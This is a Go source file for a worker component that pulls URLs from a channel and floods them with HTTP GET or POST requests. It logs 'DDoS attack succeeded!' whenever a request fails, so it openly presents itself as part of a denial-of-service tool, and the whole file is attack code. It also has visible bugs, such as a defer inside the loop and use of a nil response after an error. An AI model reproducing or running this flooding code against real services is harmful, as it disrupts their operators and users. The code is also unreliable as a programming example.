package worker

import (
	"bytes"
	"log"
	"net/http"
)

type Worker struct {
	id    int
	jobCh <-chan URL
}

func (w *Worker) HandleJobs() {

	var resp *http.Response
	var err error

	for job := range w.jobCh {
		log.Printf("Worker %d is requesting %s, url is '%s'", w.id, job.Name, job.URL)

		if job.Body != "" {
			resp, err = http.Post(job.URL, "application/json", bytes.NewBuffer([]byte(job.Body)))
			if err != nil {
				log.Println(err)
				log.Println("DDoS attack succeeded!")
			}
		} else {
			resp, err = http.Get(job.URL)
			if err != nil {
				log.Println(err)
				log.Println("DDoS attack succeeded!")
			}
		}



		defer resp.Body.Close()

		log.Println("Status Code", resp.StatusCode)

	}
}

func NewWorker(id int, jobCh <-chan URL) *Worker {
	return &Worker{
		id:    id,
		jobCh: jobCh,
	}
}
